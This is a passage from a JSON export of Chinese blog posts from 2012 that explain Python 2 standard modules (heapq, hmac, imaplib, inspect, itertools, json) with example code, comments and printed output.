    "content": "<p>前言：heapq实现了适用于Python列表的小顶堆排序算法.堆是一种树型数据结构, 其父子节点间具有顺序关系. 二进制堆可以使用一个列表或数组来表示, 其中元素N的孩子所在位置为2*N+1 和 2*N+2(以0开始计算位置). 这种特征让就地重排成为可能, 这样在增加或删除元素时就不需要重新分配内存空间.大顶堆确保每个父元素都大于或等于他的任一个孩子元素. 而小顶堆则需要每个父元素都要小于或等于他的任一个孩子元素. Python的heapq模块实现的是小顶堆.</p>\n\n<p><pre class=\"sh_python\">\nimport math\nimport heapq\nfrom cStringIO import StringIO</p>\n\n<p>list = [12,19,34,2,10,1]\nheap = []\ndef show_tree(tree, total_width=36, fill=' '):  #这个方法很直观了显示了树的变化\n    output = StringIO()\n    last_row = -1\n    for i, n in enumerate(tree):\n        if i:\n            row = int(math.floor(math.log(i+1, 2)))\n        else:\n            row = 0\n        if row != last_row:\n            output.write('\\n')\n        columns = 2**row\n        col_width = int(math.floor((total_width * 1.0) / columns))\n        output.write(str(n).center(col_width, fill))\n        last_row = row\n    print output.getvalue()\n    print '-' * total_width\n    print\n    return\nfor n in list:\n    print 'add %3d:' % n\n    heapq.heappush(heap, n)  #创建一个堆,使用heappush(), 堆中元素排序顺序是随着新元素的不断增加而不断更新的\n    show_tree(heap)\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nadd  12:\n12                    #增加列表的第一个元素，因为是第一个元素 换行\n------------------------------------\nadd  19:\n12                 #因为新增的19大于12，所以成了子树一部分\n19\n------------------------------------\nadd  34:\n12\n19                34        #因为这是第三个,3的对数也还是和19在一行\n------------------------------------\nadd   2:\n2\n12                34\n19\n------------------------------------\nadd  10:\n2\n10                34\n19       12\n------------------------------------\nadd   1:\n1\n10                2\n19       12       34\n------------------------------------\n<pre class=\"sh_python\">\nimport math\nimport heapq\nfrom cStringIO import StringIO</p>\n\n<p>list = [12,19,34,2,10,1]\nheap = []\ndef show_tree(tree, total_width=36, fill=' '):\n    output = StringIO()\n    last_row = -1\n    for i, n in enumerate(tree):\n        if i:\n            row = int(math.floor(math.log(i+1, 2)))\n        else:\n            row = 0\n            print 'd'\n        if row != last_row:\n            output.write('\\n')\n        columns = 2**row\n        col_width = int(math.floor((total_width * 1.0) / columns))\n        output.write(str(n).center(col_width, fill))\n        last_row = row\n    print output.getvalue()\n    print '-' * total_width\n    print\n    return</p>\n\n<p>heapq.heapify(list)  #如果数据已经在内存中了, 使用heapify()进行就地排序会更有效.\nprint 'heapified :'\nshow_tree(list) \nprint</p>\n\n<p>inorder = []\nwhile list:\n    smallest = heapq.heappop(list)  #删掉最小的数据\n    print 'pop %3d:' % smallest #打印这个最小的数据\n    show_tree(list)\n    inorder.append(smallest)  #这个李彪从小到大的收集了原list数据\nprint 'inorder :', inorder\n</pre></p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nheapified :</p>\n\n<p>1\n2                 12\n19       10       34\n------------------------------------</p>\n\n<p>pop   1:</p>\n\n<p>2\n10                12\n19       34\n------------------------------------</p>\n\n<p>pop   2:</p>\n\n<p>10\n19                12\n34\n------------------------------------</p>\n\n<p>pop  10:</p>\n\n<p>12\n19                34\n------------------------------------</p>\n\n<p>pop  12:</p>\n\n<p>19\n34\n------------------------------------</p>\n\n<p>pop  19:</p>\n\n<p>34\n------------------------------------</p>\n\n<p>pop  34:</p>\n\n<p>------------------------------------</p>\n\n<p>inorder : [1, 2, 10, 12, 19, 34]</p>\n\n<p><pre class=\"sh_python\">\nimport math\nimport heapq\nfrom cStringIO import StringIO</p>\n\n<p>list = [12,19,34,2,10,1]\nheap = []\ndef show_tree(tree, total_width=36, fill=' '):\n    output = StringIO()\n    last_row = -1\n    for i, n in enumerate(tree):\n        if i:\n            row = int(math.floor(math.log(i+1, 2)))\n        else:\n            row = 0\n        if row != last_row:\n            output.write('\\n')\n        columns = 2**row\n        col_width = int(math.floor((total_width * 1.0) / columns))\n        output.write(str(n).center(col_width, fill))\n        last_row = row\n    print output.getvalue()\n    print '-' * total_width\n    print\n    return</p>\n\n<p>heapq.heapify(list)\nfor n in [1, 7, 12, 9, 5]:\n    smallest = heapq.heapreplace(list, n)  #这里可以删除掉原值，然后替换成新值，保持了堆的长度\n    print 'replace %2d with %2d:' % (smallest, n)\n    show_tree(list)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport heapq</p>\n\n<p>data = [12,19,34,2,10,1]\nprint 'all :', data\nprint '3 largest :', heapq.nlargest(3, data) #相对最大的3个数\nprint 'from sort :', list(reversed(sorted(data)[-3:]))  #效果一样\nprint '3 smallest:', heapq.nsmallest(3, data) #相对最小的3个数\nprint 'from sort :', sorted(data)[:3] #效果一样\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 180,
    "title": "关于hmac研究",
    "category": "python模块研究",
    "tags": [
      "hmac"
    ],
    "url": "/archives/guanyuhmacyanjiu/",
    "content": "<p>前言：hmac是一个加密签名和验证的消息的模块，主要验证数据在传送或者储存后是否完整，基本思路是生成一个共享密钥结合实际数据的加密hash</p>\n\n<p><pre class=\"sh_python\">\nimport hmac\nimport hashlib</p>\n\n<p>digest_maker = hmac.new('secret-shared-key-goes-here', '', hashlib.sha1) #默认使用md5，将第三个参数置空，但是md5可能发生碰撞（2个文件的md5值一样），这里用sha1</p>\n\n<p>f = open('text1', 'rb')\ntry:\n    while True:\n        block = f.read(1024)\n        if not block:\n            break\n        digest_maker.update(block)\nfinally:\n    f.close()</p>\n\n<p>print digest_maker.hexdigest()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport base64\nimport hmac\nimport hashlib</p>\n\n<p>f = open('text1', 'rb')\ntry:\n    body = f.read()\nfinally:\n    f.close()</p>\n\n<p>digest = hmac.new('secret-shared-key-goes-here', body, hashlib.sha1).digest() #有些场景（比如http post等）不使用update，而直接把内容放到new()\nprint base64.encodestring(digest) #有些服务或者内容包含非ascii字符或者提供的网络服务使用<tt>base64</tt>编码的二进制版本，那么就要编码一下\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 181,
    "title": "关于imaplib研究",
    "category": "python模块研究",
    "tags": [
      "imaplib"
    ],
    "url": "/archives/guanyuimaplibyanjiu/",
    "content": "<p>前言：imaplib是IMAP4的客户端库，用来接收imap协议服务器的邮件模块</p>\n\n<p><pre class=\"sh_python\">\nimport imaplib\nimport re\nfrom pprint import pprint\nlist_response_pattern = re.compile(r'\\((?P&lt;flags&gt;.*?)\\) \"(?P&lt;delimiter&gt;.*)\" (?P&lt;name&gt;.*)')\n#imaplib.Debug = 4 #设置debug模式\n def parse_list_response(line):\n    flags, delimiter, mailbox_name = list_response_pattern.match(line).groups()\n    mailbox_name = mailbox_name.strip('\"')\n    return (flags, delimiter, mailbox_name)</p>\n\n<p>hostname='imap.qq.com' #设置收取腾讯邮件\nconnection = imaplib.IMAP4_SSL(hostname)  #要求使用SSL加密方式登录  不强制的话可以用imaplib.IMAP4</p>\n\n<p>username = 'XXX' #用户名\npassword = 'YYYY' #密码\nprint 'Logging in as', username\nconnection.login(username, password)  #连接  注意我这个程序没有异常处理\ntyp,data =  connection.list()  #检索Mailbox\npprint(data)</p>\n\n<p>for line in data:\n    flags, delimiter, mailbox_name = parse_list_response(line)\n    print 'Parsed response:', (flags, delimiter, mailbox_name)\n    print connection.status(mailbox_name, '(MESSAGES RECENT UIDNEXT UIDVALIDITY UNSEEN)') #邮箱状态,MESSAGES:消息数量，RECENT：最近查看的邮件数量，\n                                                在#UIDNEXT：邮箱的下一个唯一标识符值,UIDVALIDITY:邮箱的有效性的唯一标识符值,UNSEEN:还没有查看的邮件数量\n    connection.select(mailbox_name, readonly=True)  \n    typ, msg_ids = connection.search(None, 'ALL')#寻找邮件包含'ALL'数量\n    typ, msg_ids = connection.search(None, '( FROM \"Doug\" SUBJECT \"test message 2\")')  #寻找邮件主题包含’test message 2‘，发件人是'Doug'的邮件数量\n    typ, msg_data = c.fetch('1', '(BODY.PEEK[HEADER] FLAGS)') #\n    print mailbox_name, typ, msg_ids    </p>\n\n<p>try:\n    connection.select('INBOX', readonly=True)</p>\n\n<p>    print 'HEADER:'\n    typ, msg_data = connection.fetch('1', '(BODY.PEEK[HEADER])')\n    for response_part in msg_data:\n        if isinstance(response_part, tuple):\n            print response_part[1]  #打印邮件头内容</p>\n\n<p>    print 'BODY TEXT:'\n    typ, msg_data = connection.fetch('1', '(BODY.PEEK[TEXT])')\n    for response_part in msg_data:\n        if isinstance(response_part, tuple):\n            print response_part[1] #打印内容</p>\n\n<p>    print '\\nFLAGS:'\n    typ, msg_data = connection.fetch('1', '(FLAGS)')\n    for response_part in msg_data:\n        print response_part\n        print imaplib.ParseFlags(response_part)\nfinally:\n    try:\n        c.close()\n    except:\n        pass\nconnection.logout()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport imaplib\nimport email\nimport time\nimport email.message\nimport re</p>\n\n<p>hostname='imap.qq.com'\nconnection = imaplib.IMAP4_SSL(hostname)</p>\n\n<p>username = 'XXX' \npassword = 'YYY'\nprint 'Logging in as', username\nconnection.login(username, password)</p>\n\n<p>new_message = email.message.Message()\nnew_message.set_unixfrom('pymotw')\nnew_message['Subject'] = 'subject goes here'\nnew_message['From'] = 'pymotw@example.com'\nnew_message['To'] = 'example@example.com'\nnew_message.set_payload('This is the body of the message.\\n')</p>\n\n<p>print new_message #想增加一封邮件\ntry:\n    connection.append('INBOX', '', imaplib.Time2Internaldate(time.time()), str(new_message)) #给收件箱添加一封邮件\n    connection.select('INBOX', readonly=True) #选定收件箱\n    typ, msg_data = connection.fetch('1', '(RFC822)')  #获取RFC822邮件\n    for response_part in msg_data:\n        if isinstance(response_part, tuple):\n            msg = email.message_from_string(response_part[1])\n            for header in [ 'subject', 'to', 'from' ]:\n                print '%-8s: %s' % (header.upper(), msg[header]) #打印主题，发件人和收件人\n    typ, [response] = connection.search(None, 'SEEN')  #搜索查看过得邮件\n    if typ != 'OK':\n        raise RuntimeError(response)</p>\n\n<p>    msg_ids = ','.join(response.split(' '))\n    typ, create_response = connection.create('Archive.Today')  #创建一个邮箱\n    print 'CREATED Archive.Today:', create_response </p>\n\n<p>    print 'COPYING:', msg_ids\n    connection.copy(msg_ids, 'Archive.Today') #拷贝那些邮件到这里</p>\n\n<p>    connection.select('Archive.Today')\n    typ, [response] = connection.search(None, 'ALL')\n    print 'COPIED:', response\n    typ, response = connection.store(msg_ids, '+FLAGS', r'(\\Deleted)')  #设置删除的标识\n    typ, response = connection.fetch(msg_ids, '(FLAGS)') \n    print 'Flags after:', response</p>\n\n<p>    typ, response = connection.expunge() #删除邮件 \n    print 'Expunged:', response\nfinally:\n    try:\n        connection.close()\n    except:\n        pass\n    connection.logout()\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 182,
    "title": "关于inspect研究",
    "category": "python模块研究",
    "tags": [
      "inspect"
    ],
    "url": "/archives/guanyuinspectyanjiu/",
    "content": "<p>前言：inspect是一个检查活动对象的模块</p>\n\n<p>这里有个例子文件example.py：</p>\n\n<p><pre class=\"sh_python\">\n\"\"\"Sample file to serve as the basis for inspect examples.\n\"\"\"</p>\n\n<p>def module_level_function(arg1, arg2='default', *args, **kwargs):\n    \"\"\"This function is declared in the module.\"\"\"\n    local_variable = arg1\n    return</p>\n\n<p>class A(object):\n    \"\"\"The A class.\"\"\"\n    def __init__(self, name):\n        self.name = name</p>\n\n<p>    def get_name(self):\n        \"Returns the name of the instance.\"\n        return self.name</p>\n\n<p>instance_of_a = A('sample_instance')</p>\n\n<p>class B(A):\n    \"\"\"This is the B class.\n    It is derived from A.\n    \"\"\"</p>\n\n<p>    # This method is not part of A.\n    def do_something(self):\n        \"\"\"Does some work\"\"\"\n        pass</p>\n\n<p>    def get_name(self):\n        \"Overrides version from A\"\n        return 'B(' + self.name + ')'\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport inspect\nimport pprint\nimport example</p>\n\n<p>for name, data in inspect.getmembers(example):#过滤返回的对象,元组每个列表2个数据:成员名称，成员类型\n    if name == '__builtins__':  #内置模块不属于实际模块，忽略\n        continue\n    print '%s :' % name, repr(data)\nprint\nfor name, data in inspect.getmembers(example, inspect.isclass): #这个谓语限定只要返回 类\n    print '%s :' % name, repr(data)\npprint.pprint(inspect.getmembers(example.A)) #由于没有过滤，输出显示的属性，方法，slots，和其他类的成员\nprint \npprint.pprint(inspect.getmembers(example.A, inspect.ismethod)) #过滤只返回类的方法</p>\n\n<p>print inspect.getdoc(example.B) #返回文档字符串，也就是__doc__的内容</p>\n\n<p>print inspect.getcomments(example.B.do_something) #返回评论，打印方法前面的注释\nprint inspect.getsource(example.A.get_name)  #如果<tt>py</tt>文件是用于一个模块，类或方法的原始源代码可以使用inspect.getsource或者下面的getsourcelines检索\npprint.pprint(inspect.getsourcelines(example.A.get_name))  \narg_spec = inspect.getargspec(example.module_level_function) #getargspec函数返回一个包含位置参数名称的列表\nprint 'NAMES   :', arg_spec[0]\nprint '*       :', arg_spec[1]\nprint '**      :', arg_spec[2]\nprint 'defaults:', arg_spec[3]</p>\n\n<p>class C(example.B):\n    pass</p>\n\n<p>class D(C, example.A):\n    pass</p>\n\n<p>def print_class_tree(tree, indent=-1):\n    if isinstance(tree, list):\n        for node in tree:\n            print_class_tree(node, indent+1)\n    else:\n        print '  ' * indent, tree[0].__name__\n    return</p>\n\n<p>print 'A, B, C, D:'\nprint_class_tree(inspect.getclasstree([example.A, example.B, C, D])) #显示类层次结构，创建一个类似树状的数据结构，使用基于它被赋予的类和基类的嵌套列表和元组。\n                                                      # 在返回列表中的每个元素可以是一个类和它的基类，或另一个子类的列表，其中包含元组的元组\nclass C(object):\n    pass</p>\n\n<p>class C_First(C, example.B):\n    pass</p>\n\n<p>class B_First(example.B, C):\n    pass</p>\n\n<p>print 'B_First:'\nfor c in inspect.getmro(B_First):  #返回一个元组的顺序,显示类继承的顺序，从底层到最上层\n    print '\\t', c.__name__\nprint\nprint 'C_First:'\nfor c in inspect.getmro(C_First):\n    print '\\t', c.__name__\ndef recurse(limit):  \n    local_variable = '.' * limit\n    print limit, inspect.getargvalues(inspect.currentframe()) #堆栈的顶部（当前函数）的框架,返回一个参数名，可变参数的名称和本地变量字典的tuple\n    if limit &lt;= 0:\n        return\n    recurse(limit - 1)\n    return\nrecurse(3)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nA : &lt;class 'example.A'&gt;\nB : &lt;class 'example.B'&gt;\n__doc__ : 'Sample file to serve as the basis for inspect examples.\\n'\n__file__ : '/home/dongwm/example.pyc'\n__name__ : 'example'\n__package__ : None\ninstance_of_a : &lt;example.A object at 0xb7403cec&gt;\nmodule_level_function : &lt;function module_level_function at 0xb740709c&gt;</p>\n\n<p>A : &lt;class 'example.A'&gt;\nB : &lt;class 'example.B'&gt;\n[('__class__', &lt;type 'type'&gt;),\n('__delattr__', &lt;slot wrapper '__delattr__' of 'object' objects&gt;),\n('__dict__', &lt;dictproxy object at 0xb740a044&gt;),\n('__doc__', 'The A class.'),\n('__format__', &lt;method '__format__' of 'object' objects&gt;),\n('__getattribute__', &lt;slot wrapper '__getattribute__' of 'object' objects&gt;),\n('__hash__', &lt;slot wrapper '__hash__' of 'object' objects&gt;),\n('__init__', &lt;unbound method A.__init__&gt;),\n('__module__', 'example'),\n('__new__', &lt;built-in method __new__ of type object at 0xb784cb80&gt;),\n('__reduce__', &lt;method '__reduce__' of 'object' objects&gt;),\n('__reduce_ex__', &lt;method '__reduce_ex__' of 'object' objects&gt;),\n('__repr__', &lt;slot wrapper '__repr__' of 'object' objects&gt;),\n('__setattr__', &lt;slot wrapper '__setattr__' of 'object' objects&gt;),\n('__sizeof__', &lt;method '__sizeof__' of 'object' objects&gt;),\n('__str__', &lt;slot wrapper '__str__' of 'object' objects&gt;),\n('__subclasshook__',\n&lt;built-in method __subclasshook__ of type object at 0x81078ac&gt;),\n('__weakref__', &lt;attribute '__weakref__' of 'A' objects&gt;),\n('get_name', &lt;unbound method A.get_name&gt;)]</p>\n\n<p>[('__init__', &lt;unbound method A.__init__&gt;),\n('get_name', &lt;unbound method A.get_name&gt;)]\nThis is the B class.\nIt is derived from A.\n# This method is not part of A.</p>\n\n<p>def get_name(self):\n\"Returns the name of the instance.\"\nreturn self.name</p>\n\n<p>(['    def get_name(self):\\n',\n'        \"Returns the name of the instance.\"\\n',\n'        return self.name\\n'],\n14)\nNAMES   : ['arg1', 'arg2']\n*       : args\n**      : kwargs\ndefaults: ('default',)\nA, B, C, D:\nobject\nA\nD\nB\nC\nD\nB_First:\nB_First\nB\nA\nC\nobject</p>\n\n<p>C_First:\nC_First\nC\nB\nA\nobject\n3 ArgInfo(args=['limit'], varargs=None, keywords=None, locals={'local_variable': '...', 'limit': 3})\n2 ArgInfo(args=['limit'], varargs=None, keywords=None, locals={'local_variable': '..', 'limit': 2})\n1 ArgInfo(args=['limit'], varargs=None, keywords=None, locals={'local_variable': '.', 'limit': 1})\n0 ArgInfo(args=['limit'], varargs=None, keywords=None, locals={'local_variable': '', 'limit': 0})</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 183,
    "title": "关于itertools研究",
    "category": "python模块研究",
    "tags": [
      "chain",
      "cycle",
      "dropwhile",
      "groupby",
      "ifilter",
      "ifilterfalse",
      "imap",
      "islice",
      "itertools",
      "izip",
      "repeat",
      "starmap",
      "takewhile",
      "tee"
    ],
    "url": "/archives/guanyuitertoolsyanjiu/",
    "content": "<p>前言：itertools用于高效循环的迭代函数集合</p>\n\n<p><strong>1 chain 合并迭代器 ：将多个迭代器作为参数, 但只返回单个迭代器, 它产生所有参数迭代器的内容, 就好像他们是来自于一个单一的序列.</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import chain\nfor i in chain([1, 2, 3], ['a', 'b', 'c']):\n    print i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>2 izip 切分迭代器 ：返回一个合并了多个迭代器为一个元组的迭代器. 它类似于内置函数zip(), 只是它返回的是一个迭代器而不是一个列表.</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import izip\nfor i in izip([1, 2, 3], ['a', 'b', 'c']):\n    print i\n</pre></p>\n\n<p><strong>3 count 返回一个不断产生连续整数的迭代器. 第一个数可以由参数指定, 默认为0. 它没有上届参数(可参见内置函数 <tt>xrange()</tt> , 它更好的控制结果集). 在下面的例子中, 迭代器由于参数列表结束而停止.</strong></p>\n\n<p><strong>4 </strong><tt><strong>islice 返回的迭代器是返回了输入迭代器根据索引来选取的项.</strong>\n</tt></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import islice,count #count\nprint 'Stop at 5:'\nfor i in islice(count(), 5):\n    print i\nprint 'By tens to 100:' \nfor i in islice(count(), 0, 100, 10):  #从0开始 步长为10  最大是100\n    print i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>5 tee 返回一些基于单个原始输入的独立迭代器(默认为2). 它和Unix上的tee工具有点语义相似, </strong></p>\n\n<p><strong>也就是说它们都重复读取输入设备中的值并将值写入到一个命名文件和标准输出中</strong></p>\n\n<p><pre class=\"sh_python\">\nr = islice(count(), 5)\ni1, i2 = tee(r) </p>\n\n<p>for i in i1:\n    print 'i1:', i\nfor i in i2:\n    print 'i2:', i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>6 <tt>imap</tt> 返回一个迭代器, 它是调用了一个其值在输入迭代器上的函数, 返回结果. 它类似于内置函数 <tt>map()</tt> , 只是前者在</strong></p>\n\n<p><strong>任意输入迭代器结束后就停止(而不是插入None值来补全所有的输入).</strong></p>\n\n<p><pre class=\"sh_python\">\nprint 'Doubles:'\nfor i in imap(lambda x:2*x, xrange(5)):\n    print i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>7 <tt>starmap</tt> <tt>starmap()</tt> 函数类似于 <tt>imap()</tt> , 但是在从多个迭代器中构造元组时, 它先将各个项切分成单个迭代器并将它作为参数以*语</strong></p>\n\n<p><strong>法传递给映射函数. <tt>imap()</tt> 的映射函数被称为f(i1, i2), <tt>startmap()</tt> 的映射函数被称为f(<a href=\"http://pymotwcn.readthedocs.org/en/latest/documents/itertools.html#id4\">*</a>i).</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import starmap\nvalues = [(0, 5), (1, 6), (2, 7), (3, 8), (4, 9)]\nfor i in starmap(lambda x,y:(x, y, x*y), values):\n    print '%d * %d = %d' % i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>8 <tt>cycle</tt> 返回一个不断重复参数内容的迭代器. 由于它必须记住整个输入迭代器的内容, 所以如果输入迭代器很长的话, 它可能会消耗大量</strong></p>\n\n<p><strong>的内存. 在下面的例子中, 一个计数变量用于在一定数量的循环后, 跳出循环</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import cycle\ni = 0\nfor item in cycle(['a', 'b', 'c']):\n    i += 1\n    if i == 10:\n        break\n    print (i, item)\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>9 <tt>repeat</tt> 函数返回一个每次都产生相同值的迭代器. 它也是永远继续的, 除非你设置了times参数来限制.</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import  repeat\nfor i in repeat('over-and-over', 5):\n    print i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>10 <tt>dropwhile</tt> 函数返回一个当条件为false之后的输入迭代器中剩余元素的迭代器. 它不过滤输入迭代器中的每一个项; </strong></p>\n\n<p><strong>在条件为false之后的第一次, 返回迭代器中剩下来的项.</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import dropwhile\ndef should_drop(x):\n    print 'Testing:', x\n    return (x&lt;1)</p>\n\n<p>for i in dropwhile(should_drop, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):\n    print 'Yielding:', i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>11 <tt>takewhile ：和dropwhile相反, 它返回的是一个产生输入迭代器中只要测试函数返回true的项的迭代器</tt></strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import takewhile</p>\n\n<p>def should_take(x):\n    print 'Testing:', x\n    return (x&lt;2)</p>\n\n<p>for i in takewhile(should_take, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):\n    print 'Yielding:', i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>12 <tt>ifilter</tt> 返回的是迭代器类似于针对列表的内置函数 <tt>filter()</tt> , 它只包括当测试函数返回true时的项. 它不同于 <tt>dropwhile()</tt> </strong></p>\n\n<p><strong>的是每个项是在被返回之前进行测试的.</strong></p>\n\n<p><pre class=\"sh_python\">\ndef check_item(x):\n    print 'Testing:', x\n    return (x&lt;1)</p>\n\n<p>for i in ifilter(check_item, [ -1, 0, 1, 2, 3, 4, 1, -2 ]):\n    print 'Yielding:', i\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><strong>13  <tt> </tt><tt>ifilterfalse</tt> 和ifilter(函数相反 ， 返回一个包含那些测试函数返回false的项的迭代器.</strong></p>\n\n<p><strong>14 <tt>groupby</tt> 返回一个产生按照key进行分组后的值集合的迭代器.</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom itertools import *\nfrom operator import itemgetter</p>\n\n<p>d = dict(a=1, b=2, c=1, d=2, e=1, f=2, g=3)\ndi = sorted(d.iteritems(), key=itemgetter(1))\nfor k, g in groupby(di, key=itemgetter(1)):\n    print k, map(itemgetter(0), g)  #将一个字典根据值将关键字分组\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 184,
    "title": "关于json研究",
    "category": "python模块研究",
    "tags": [
      "json"
    ],
    "url": "/archives/guanyujsonyanjiu/",
    "content": "<p>前言：json模块全称JavaScript对象符号的序列话，他是理想的数据交换语言。易于人阅读和编写，同时也易于机器解析和生成，在python2.6之前是<em>simplejson</em>，需要安装。有点像<tt>pickle,但是广泛使用在Web服务器和客户端AJAX应用程序之间的通信</tt></p>\n\n<p><pre class=\"sh_python\">\nimport json</p>\n\n<p>data = [ { 'x':'A', 'y':(2, 4), 'z':3.0 } ]\nprint 'DATA:', repr(data)</p>\n\n<p>unsorted = json.dumps(data)\nprint 'JSON:', json.dumps(data)  #编码为json，支持string, unicode, int, float, list, tuple, dict，还可以设定separators，设定分割符，\n                                #当key不是字符串会引发<em>ValueError</em>,skipkeys=True的话会过滤掉\nprint 'SORT:', json.dumps(data, sort_keys=True) #编码并且按键排序</p>\n\n<p>first = json.dumps(data, sort_keys=True)\nsecond = json.dumps(data, sort_keys=True)\nprint 'INDENT:', json.dumps(data, sort_keys=True, indent=2) #指定缩进值，输出类似于pprint</p>\n\n<p>\nprint 'UNSORTED MATCH:', unsorted == first\nprint 'SORTED MATCH  :', first == second\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nDATA: [{'y': (2, 4), 'x': 'A', 'z': 3.0}]\nJSON: [{\"y\": [2, 4], \"x\": \"A\", \"z\": 3.0}]\nSORT: [{\"x\": \"A\", \"y\": [2, 4], \"z\": 3.0}]</p>\n\n<p>INDENT: [\n{\n\"x\": \"A\",\n\"y\": [\n2,\n4\n],\n\"z\": 3.0\n}\n]\nUNSORTED MATCH: False\nSORTED MATCH  : True\n<pre class=\"sh_python\">\nimport json</p>\n\n<p>class MyObj(object):\n    def __init__(self, s):\n        self.s = s\n    def __repr__(self):  #设置元类，触发打印初始化的self.s\n        return '&lt;MyObj(%s)&gt;' % self.s\nobj = MyObj('instance value goes here')</p>\n\n<p>print 'First attempt'\ntry:\n    print json.dumps(obj)  #因为我们设计的不是内置支持的类型\nexcept TypeError, err:\n    print 'ERROR:', err</p>\n\n<p>def convert_to_builtin_type(obj):  #定义自己的类型\n    print 'default(', repr(obj), ')'\n    d = { '__class__':obj.__class__.__name__, \n          '__module__':obj.__module__,\n          }\n    d.update(obj.__dict__)  #保持以前的内置属性\n    return d\ndef dict_to_object(d):\n    if '__class__' in d:\n        class_name = d.pop('__class__')\n        module_name = d.pop('__module__')\n        module = __import__(module_name)\n        print 'MODULE:', module\n        class_ = getattr(module, class_name)\n        print 'CLASS:', class_\n        args = dict( (key.encode('ascii'), value) for key, value in d.items())\n        print 'INSTANCE ARGS:', args\n        inst = class_(**args)\n    else:\n        inst = d\n    return inst\nprint\nprint 'With default'\nencode = json.dumps(obj, default=convert_to_builtin_type)  #根据自己的类型编码\nprint encode\nprint json.loads(encode, object_hook=dict_to_object)  #根据hook解码</p>\n\n<p>\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>First attempt\nERROR: &lt;MyObj(instance value goes here)&gt; is not JSON serializable</p>\n\n<p>With default\ndefault( &lt;MyObj(instance value goes here)&gt; )  #触发__repr__\n{\"s\": \"instance value goes here\", \"__module__\": \"__main__\", \"__class__\": \"MyObj\"} #打印属性\nMODULE: &lt;module '__main__' from 'test.py'&gt;\nCLASS: &lt;class '__main__.MyObj'&gt;\nINSTANCE ARGS: {'s': 'instance value goes here'}\n&lt;MyObj(instance value goes here)&gt;\n<pre class=\"sh_python\">\nimport json</p>\n\n<p>encoder = json.JSONEncoder()  \ndata = [ { 'a':'A', 'b':(2, 4), 'c':3.0 } ]</p>\n\n<p>for part in encoder.iterencode(data): #生成生产编码数据的 “chunks”的迭代器\n    print 'PART:', part</p>\n\n<p>print \nclass MyObj(object):\n    def __init__(self, s):\n        self.s = s\n    def __repr__(self):\n        return '&lt;MyObj(%s)&gt;' % self.s\nclass MyEncoder(json.JSONEncoder):  #通过使用类，可以创建子类来定制自己的行为，就和上面一样，他继承了json.JSONEncode</p>\n\n<p>    def default(self, obj):   #和上面的莉子效果一样，但是使用了类API,重写了default方法\n        print 'default(', repr(obj), ')'\n        d = { '__class__':obj.__class__.__name__, \n              '__module__':obj.__module__,\n              }\n        d.update(obj.__dict__)\n        return d\nclass MyDecoder(json.JSONDecoder):</p>\n\n<p>    def __init__(self):\n        json.JSONDecoder.__init__(self, object_hook=self.dict_to_object)  #和上面一行，指定hook的初始化</p>\n\n<p>    def dict_to_object(self, d):\n        if '__class__' in d:\n            class_name = d.pop('__class__')\n            module_name = d.pop('__module__')\n            module = __import__(module_name)\n            print 'MODULE:', module\n            class_ = getattr(module, class_name)\n            print 'CLASS:', class_\n            args = dict( (key.encode('ascii'), value) for key, value in d.items())\n            print 'INSTANCE ARGS:', args\n            inst = class_(**args)\n        else:\n            inst = d\n        return inst\nobj = MyObj('internal data')\nprint obj\nencode = MyEncoder().encode(obj)\nprint encode\nprint '-'*30\nmyobj_instance = MyDecoder().decode(encode)\nprint myobj_instance\n</pre>\n<pre class=\"sh_python\">\nimport json\nimport tempfile</p>\n\n<p>f = tempfile.NamedTemporaryFile(mode='w+')  #用随机文件模块生成一个随机文件，在操作完后自动删除这个文件\nf.write('[{\"a\": \"A\", \"c\": 3.0, \"b\": [2, 4]}]') \nf.flush() #<span>写入缓冲区的任何数据都复制到文件中，并且缓冲区被清除</span>\nf.seek(0)  #把指针指到文件最开始的位置</p>\n\n<p>print json.load(f)\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "14"
    }
  },
  {
    "id": 185,
    "title": "关于linecache研究",
    "category": "python模块研究",
    "tags": [
      "linecache"
    ],
    "url": "/archives/guanyulinecacheyanjiu/",
